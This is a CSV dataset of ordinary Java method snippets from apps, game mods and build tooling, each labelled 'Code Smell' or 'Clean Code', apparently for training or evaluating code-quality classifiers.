text,label,text_label
"@Override public G.CompilationUnit visitCompilationUnit(G.CompilationUnit cu,ExecutionContext ctx){
  Optional<BuildTool> maybeBuildTool=cu.getMarkers().findFirst(BuildTool.class);
  if (!maybeBuildTool.isPresent()) {
    return cu;
  }
  BuildTool buildTool=maybeBuildTool.get();
  if (buildTool.getType() != BuildTool.Type.Gradle) {
    return cu;
  }
  VersionComparator versionComparator=Semver.validate(""(,6)"",null).getValue();
  if (versionComparator == null) {
    return cu;
  }
  if (containsGradleEnterpriseDsl(cu)) {
    return cu;
  }
  boolean gradleSixOrLater=versionComparator.compare(null,buildTool.getVersion(),""6.0"") >= 0;
  if (gradleSixOrLater && cu.getSourcePath().endsWith(""settings.gradle"")) {
    Optional<GradleSettings> maybeGradleSettings=cu.getMarkers().findFirst(GradleSettings.class);
    if (!maybeGradleSettings.isPresent()) {
      return cu;
    }
    GradleSettings gradleSettings=maybeGradleSettings.get();
    cu=withPlugin(cu,""com.gradle.enterprise"",versionComparator,null,gradleSettings,ctx);
  }
 else   if (!gradleSixOrLater && cu.getSourcePath().toString().equals(""build.gradle"")) {
    Optional<GradleProject> maybeGradleProject=cu.getMarkers().findFirst(GradleProject.class);
    if (!maybeGradleProject.isPresent()) {
      return cu;
    }
    GradleProject gradleProject=maybeGradleProject.get();
    cu=withPlugin(cu,""com.gradle.build-scan"",versionComparator,gradleProject,null,ctx);
  }
  return cu;
}",1,Code Smell
"private static byte[] getDataFromImage(Image image,int colorFormat){
  if (colorFormat != COLOR_FormatI420 && colorFormat != COLOR_FormatNV21) {
    throw new IllegalArgumentException(""only support COLOR_FormatI420 "" + ""and COLOR_FormatNV21"");
  }
  if (!isImageFormatSupported(image)) {
    throw new RuntimeException(""can't convert Image to byte array, format "" + image.getFormat());
  }
  Rect crop=image.getCropRect();
  int format=image.getFormat();
  int width=crop.width();
  int height=crop.height();
  Image.Plane[] planes=image.getPlanes();
  byte[] data=new byte[width * height * ImageFormat.getBitsPerPixel(format) / 8];
  byte[] rowData=new byte[planes[0].getRowStride()];
  if (VERBOSE)   Log.v(TAG,""get data from "" + planes.length + "" planes"");
  int channelOffset=0;
  int outputStride=1;
  for (int i=0; i < planes.length; i++) {
switch (i) {
case 0:
      channelOffset=0;
    outputStride=1;
  break;
case 1:
if (colorFormat == COLOR_FormatI420) {
  channelOffset=width * height;
  outputStride=1;
}
 else if (colorFormat == COLOR_FormatNV21) {
  channelOffset=width * height + 1;
  outputStride=2;
}
break;
case 2:
if (colorFormat == COLOR_FormatI420) {
channelOffset=(int)(width * height * 1.25);
outputStride=1;
}
 else if (colorFormat == COLOR_FormatNV21) {
channelOffset=width * height;
outputStride=2;
}
break;
}
ByteBuffer buffer=planes[i].getBuffer();
int rowStride=planes[i].getRowStride();
int pixelStride=planes[i].getPixelStride();
if (VERBOSE) {
Log.v(TAG,""pixelStride "" + pixelStride);
Log.v(TAG,""rowStride "" + rowStride);
Log.v(TAG,""width "" + width);
Log.v(TAG,""height "" + height);
Log.v(TAG,""buffer size "" + buffer.remaining());
}
int shift=(i == 0) ? 0 : 1;
int w=width >> shift;
int h=height >> shift;
buffer.position(rowStride * (crop.top >> shift) + pixelStride * (crop.left >> shift));
for (int row=0; row < h; row++) {
int length;
if (pixelStride == 1 && outputStride == 1) {
length=w;
buffer.get(data,channelOffset,length);
channelOffset+=length;
}
 else {
length=(w - 1) * pixelStride + 1;
buffer.get(rowData,0,length);
for (int col=0; col < w; col++) {
data[channelOffset]=rowData[col * pixelStride];
channelOffset+=outputStride;
}
}
if (row < h - 1) {
buffer.position(buffer.position() + rowStride - length);
}
}
if (VERBOSE) Log.v(TAG,""Finished reading data from plane "" + i);
}
return data;
}",1,Code Smell
"void doReloadUninitializedMainDictionaries(final Context context,final List<Locale> locales,final DictionaryInitializationListener listener,final CountDownLatch latchForWaitingLoadingMainDictionary){
  final Dictionary[] mainDicts=new Dictionary[locales.size()];
  final ArrayList<DictionaryGroup> dictionaryGroups=new ArrayList<>();
  for (int i=0; i < locales.size(); i++) {
    Locale locale=locales.get(i);
    DictionaryGroup dictionaryGroup=findDictionaryGroupWithLocale(mDictionaryGroups,locale);
    if (null == dictionaryGroup) {
      Log.w(TAG,""Expected a dictionary group for "" + locale + "" but none found"");
      return;
    }
    dictionaryGroups.add(dictionaryGroup);
    if (dictionaryGroup.mMainDict != null && dictionaryGroup.mMainDict.isInitialized()) {
      mainDicts[i]=null;
      continue;
    }
    mainDicts[i]=DictionaryFactoryKt.createMainDictionary(context,dictionaryGroup.mLocale);
  }
synchronized (mLock) {
    for (int i=0; i < locales.size(); i++) {
      final Locale locale=locales.get(i);
      if (mainDicts[i] == null)       continue;
      if (locale.equals(dictionaryGroups.get(i).mLocale)) {
        dictionaryGroups.get(i).setMainDict(mainDicts[i]);
      }
 else {
        mainDicts[i].close();
      }
    }
  }
  if (listener != null) {
    listener.onUpdateMainDictionaryAvailability(hasAtLeastOneInitializedMainDictionary());
  }
  latchForWaitingLoadingMainDictionary.countDown();
}",1,Code Smell
"public boolean matchJson(String requestJson){
  String jsonStr=jsonBody.getJsonValue();
  if (StringUtils.startsWith(requestJson,""{"") && StringUtils.endsWith(requestJson,""}"")) {
    if (StringUtils.startsWith(jsonStr,""{"") && StringUtils.endsWith(jsonStr,""}"")) {
      Map<String,Object> mockMap=JSON.parseMap(jsonStr);
      Map<String,Object> requestMap=JSON.parseMap(requestJson);
      return this.matchObject(mockMap,requestMap);
    }
 else {
      return false;
    }
  }
  if (StringUtils.startsWith(requestJson,""["") && StringUtils.endsWith(requestJson,""]"")) {
    List<Object> requestList=JSON.parseArray(requestJson,Object.class);
    if (StringUtils.startsWith(jsonStr,""{"") && StringUtils.endsWith(jsonStr,""}"")) {
      Map<String,Object> mockMap=JSON.parseMap(jsonStr);
      for (      Object requestObj : requestList) {
        if (this.matchObject(mockMap,requestObj)) {
          return true;
        }
      }
      return false;
    }
 else     if (StringUtils.startsWith(jsonStr,""["") && StringUtils.endsWith(jsonStr,""]"")) {
      List<Object> mockList=JSON.parseArray(requestJson,Object.class);
      for (      Object mockObj : mockList) {
        boolean match=false;
        for (int i=0; i < requestList.size(); i++) {
          Object requestObj=requestList.get(i);
          match=this.matchObject(mockObj,requestObj);
          if (match) {
            requestList.remove(i);
            break;
          }
        }
        if (!match) {
          return false;
        }
      }
      return true;
    }
    return false;
  }
  return false;
}",1,Code Smell
"public String toString(){
  return ""JsonSchemaProperty{key="" + this.key + "", value=""+ this.value+ ""}"";
}
",0,Clean Code
"/** 
 * @author
 */
@Overwrite public void apply(){
  if (!this.isLegacy)   return;
  if (this.MODEL_VIEW_MATRIX != null) {
    this.MODEL_VIEW_MATRIX.set(RenderSystem.getModelViewMatrix());
  }
  if (this.PROJECTION_MATRIX != null) {
    this.PROJECTION_MATRIX.set(RenderSystem.getProjectionMatrix());
  }
  if (this.COLOR_MODULATOR != null) {
    this.COLOR_MODULATOR.set(RenderSystem.getShaderColor());
  }
  if (this.INVERSE_VIEW_ROTATION_MATRIX != null) {
    this.INVERSE_VIEW_ROTATION_MATRIX.set(RenderSystem.getInverseViewRotationMatrix());
  }
  if (this.COLOR_MODULATOR != null) {
    this.COLOR_MODULATOR.set(RenderSystem.getShaderColor());
  }
  if (this.GLINT_ALPHA != null) {
    this.GLINT_ALPHA.set(RenderSystem.getShaderGlintAlpha());
  }
  if (this.FOG_START != null) {
    this.FOG_START.set(RenderSystem.getShaderFogStart());
  }
  if (this.FOG_END != null) {
    this.FOG_END.set(RenderSystem.getShaderFogEnd());
  }
  if (this.FOG_COLOR != null) {
    this.FOG_COLOR.set(RenderSystem.getShaderFogColor());
  }
  if (this.FOG_SHAPE != null) {
    this.FOG_SHAPE.set(RenderSystem.getShaderFogShape().getIndex());
  }
  if (this.TEXTURE_MATRIX != null) {
    this.TEXTURE_MATRIX.set(RenderSystem.getTextureMatrix());
  }
  if (this.GAME_TIME != null) {
    this.GAME_TIME.set(RenderSystem.getShaderGameTime());
  }
  if (this.SCREEN_SIZE != null) {
    Window window=Minecraft.getInstance().getWindow();
    this.SCREEN_SIZE.set((float)window.getWidth(),(float)window.getHeight());
  }
  if (this.LINE_WIDTH != null) {
    this.LINE_WIDTH.set(RenderSystem.getShaderLineWidth());
  }
}
",0,Clean Code
"public Builder embeddings(List<float[]> embeddings){
  if (embeddings != null) {
    this.embeddings=embeddings;
  }
  return this;
}
",0,Clean Code
"private static void onShutdown(){
  if (gameServer != null) {
    gameServer.onShutdown();
  }
  if (pluginManager != null) {
    pluginManager.disablePlugins();
  }
}
",0,Clean Code
"@Override public String getTipMsg(){
  return this.mInfo.getTipMsg();
}
",0,Clean Code
"public static List<String> getRsHeader(ResultSet rs){
  try {
    ResultSetMetaData resultSetMetaData=rs.getMetaData();
    int col=resultSetMetaData.getColumnCount();
    List<String> headerList=Lists.newArrayListWithExpectedSize(col);
    for (int i=1; i <= col; i++) {
      headerList.add(getColumnName(resultSetMetaData,i));
    }
    return headerList;
  }
 catch (  SQLException e) {
    throw new RuntimeException(e);
  }
}",0,Clean Code
"/** 
 * <code>optional string display_name = 5;</code>
 * @return internal {@code Utf8String} representation of displayName for modifications
 */
public Utf8String getMutableDisplayNameBytes(){
  bitField0_|=0x00000010;
  return this.displayName;
}",0,Clean Code
"boolean isQQMsgListChannel(@NotNull String str,@NotNull String str2);",0,Clean Code
"/** 
 * @return factory for creating PlayerBasicInfo messages
 */
public static MessageFactory<PlayerBasicInfo> getFactory(){
  return PlayerBasicInfoFactory.INSTANCE;
}
",0,Clean Code
"public ZyLineContent(final String text,final Font font,final IZyEditableObject model){
  this(text,font,new ArrayList<CStyleRunData>(),model);
}
public ZyLineContent(final String text,final Font font,final List<CStyleRunData> textColorStyleRun,final IZyEditableObject model){
  Preconditions.checkNotNull(text,""Error: Text argument can't be null"");
  Preconditions.checkNotNull(textColorStyleRun,""Error: Text color style run can't be null."");
  m_model=model;
  regenerateLine(text,font,textColorStyleRun);
}
public ZyLineContent(final String text,final IZyEditableObject model){
  this(text,null,model);
}
",0,Clean Code
"/** 
 * <code>optional uint32 base_avatar_id = 8;</code>
 * @return this
 */
public TakePromotionRewardCsReq clearBaseAvatarId(){
  bitField0_&=~0x00000002;
  baseAvatarId=0;
  return this;
}",0,Clean Code
"/** 
 * @return the parentWorkflowId
 */
public String getParentWorkflowId(){
  return parentWorkflowId;
}
",0,Clean Code
"/** 
 * This is responsible for managing the  {@link BorderPane} when the {@link MFXLabeled#contentDispositionProperty()}and the  {@link MFXLabeled#gapProperty()} change.<p> Note that the gap is set by using  {@link BorderPane#setMargin(Node,Insets)} on the text node.
 */
protected void initContainer(){
  C labeled=getSkinnable();
  Pane controlContainer=getControlContainer();
  ContentDisplay disposition=labeled.getContentDisposition();
  double gap=labeled.getGap();
  topContainer.getChildren().clear();
  topContainer.setCenter(text);
switch (disposition) {
case TOP:
{
      topContainer.setTop(controlContainer);
      BorderPane.setMargin(text,InsetsFactory.top(gap));
      break;
    }
case RIGHT:
{
    topContainer.setRight(controlContainer);
    BorderPane.setMargin(text,InsetsFactory.right(gap));
    break;
  }
case BOTTOM:
{
  topContainer.setBottom(controlContainer);
  BorderPane.setMargin(text,InsetsFactory.bottom(gap));
  break;
}
case TEXT_ONLY:
case LEFT:
{
topContainer.setLeft(controlContainer);
BorderPane.setMargin(text,InsetsFactory.left(gap));
break;
}
case GRAPHIC_ONLY:
case CENTER:
{
topContainer.setCenter(controlContainer);
BorderPane.setMargin(text,InsetsFactory.none());
break;
}
}
}
",0,Clean Code
"@Override public boolean equals(Object o){
  if (this == o)   return true;
  if (o == null || getClass() != o.getClass())   return false;
  User user=(User)o;
  if (following != user.following)   return false;
  if (followerCount != user.followerCount)   return false;
  if (verified != user.verified)   return false;
  if (twitterId != user.twitterId)   return false;
  if (twitterConnected != user.twitterConnected)   return false;
  if (likeCount != user.likeCount)   return false;
  if (facebookConnected != user.facebookConnected)   return false;
  if (postCount != user.postCount)   return false;
  if (followingCount != user.followingCount)   return false;
  if (username != null ? !username.equals(user.username) : user.username != null)   return false;
  if (description != null ? !description.equals(user.description) : user.description != null)   return false;
  if (avatarUrl != null ? !avatarUrl.equals(user.avatarUrl) : user.avatarUrl != null)   return false;
  if (userId != null ? !userId.equals(user.userId) : user.userId != null)   return false;
  if (phoneNumber != null ? !phoneNumber.equals(user.phoneNumber) : user.phoneNumber != null)   return false;
  if (location != null ? !location.equals(user.location) : user.location != null)   return false;
  if (email != null ? !email.equals(user.email) : user.email != null)   return false;
  return !(error != null ? !error.equals(user.error) : user.error != null);
}
",0,Clean Code
"public RawCombinedFunction getCombinedFunction(){
  return (RawCombinedFunction)combinedDiffNode.getRawNode();
}
",0,Clean Code
"/** 
 * <code>optional .SceneInfo scene = 3;</code>
 * @return whether the scene field is set
 */
public boolean hasScene(){
  return (bitField0_ & 0x00000002) != 0;
}",0,Clean Code
"void initPlayerCfg(){
  try {
    mVodPlayerCfg=new JSONObject(mVodInfo.playerCfg);
  }
 catch (  Throwable th) {
    mVodPlayerCfg=new JSONObject();
  }
  try {
    if (!mVodPlayerCfg.has(""pl"")) {
      mVodPlayerCfg.put(""pl"",Hawk.get(HawkConfig.PLAY_TYPE,1));
    }
    if (!mVodPlayerCfg.has(""pr"")) {
      mVodPlayerCfg.put(""pr"",Hawk.get(HawkConfig.PLAY_RENDER,0));
    }
    if (!mVodPlayerCfg.has(""ijk"")) {
      mVodPlayerCfg.put(""ijk"",Hawk.get(HawkConfig.IJK_CODEC,""""));
    }
    if (!mVodPlayerCfg.has(""sc"")) {
      mVodPlayerCfg.put(""sc"",Hawk.get(HawkConfig.PLAY_SCALE,0));
    }
    if (!mVodPlayerCfg.has(""sp"")) {
      mVodPlayerCfg.put(""sp"",1.0f);
    }
    if (!mVodPlayerCfg.has(""st"")) {
      mVodPlayerCfg.put(""st"",0);
    }
    if (!mVodPlayerCfg.has(""et"")) {
      mVodPlayerCfg.put(""et"",0);
    }
  }
 catch (  Throwable th) {
  }
  mController.setPlayerConfig(mVodPlayerCfg);
}",0,Clean Code
"public GProCreateLobbyRsp(){
  this.lobbyRoomInfo=new GProLobbyRoomInfo();
}
public GProCreateLobbyRsp(GProLobbyRoomInfo gProLobbyRoomInfo){
  this.lobbyRoomInfo=new GProLobbyRoomInfo();
  this.lobbyRoomInfo=gProLobbyRoomInfo;
}
",0,Clean Code
"public static AlertDialog showSecretLocationAlert(Context context,int currentAccount,final Runnable onSelectRunnable,boolean inChat,Theme.ResourcesProvider resourcesProvider){
  ArrayList<String> arrayList=new ArrayList<>();
  ArrayList<Integer> types=new ArrayList<>();
  int providers=5;
  if ((providers & 1) != 0) {
    arrayList.add(LocaleController.getString(""MapPreviewProviderTelegram"",R.string.MapPreviewProviderTelegram));
    types.add(0);
  }
  if ((providers & 2) != 0) {
    arrayList.add(LocaleController.getString(""MapPreviewProviderGoogle"",R.string.MapPreviewProviderGoogle));
    types.add(1);
  }
  if ((providers & 4) != 0) {
    arrayList.add(LocaleController.getString(""MapPreviewProviderYandex"",R.string.MapPreviewProviderYandex));
    types.add(3);
  }
  arrayList.add(LocaleController.getString(""MapPreviewProviderNobody"",R.string.MapPreviewProviderNobody));
  types.add(2);
  AlertDialog.Builder builder=new AlertDialog.Builder(context,resourcesProvider);
  builder.setTitle(LocaleController.getString(""MapPreviewProviderTitle"",R.string.MapPreviewProviderTitle));
  final LinearLayout linearLayout=new LinearLayout(context);
  linearLayout.setOrientation(LinearLayout.VERTICAL);
  builder.setView(linearLayout);
  for (int a=0; a < arrayList.size(); a++) {
    RadioColorCell cell=new RadioColorCell(context,resourcesProvider);
    cell.setPadding(dp(4),0,dp(4),0);
    cell.setTag(a);
    cell.setCheckColor(Theme.getColor(Theme.key_radioBackground),Theme.getColor(Theme.key_dialogRadioBackgroundChecked));
    cell.setTextAndValue(arrayList.get(a),SharedConfig.mapPreviewType == types.get(a));
    cell.setBackground(Theme.createSelectorDrawable(Theme.getColor(Theme.key_listSelector),Theme.RIPPLE_MASK_ALL));
    linearLayout.addView(cell);
    cell.setOnClickListener(v -> {
      Integer which=(Integer)v.getTag();
      SharedConfig.setSecretMapPreviewType(types.get(which));
      if (onSelectRunnable != null) {
        onSelectRunnable.run();
      }
      builder.getDismissRunnable().run();
    }
);
  }
  if (!inChat) {
    builder.setNegativeButton(LocaleController.getString(""Cancel"",R.string.Cancel),null);
  }
  AlertDialog dialog=builder.show();
  if (inChat) {
    dialog.setCanceledOnTouchOutside(false);
  }
  return dialog;
}",0,Clean Code
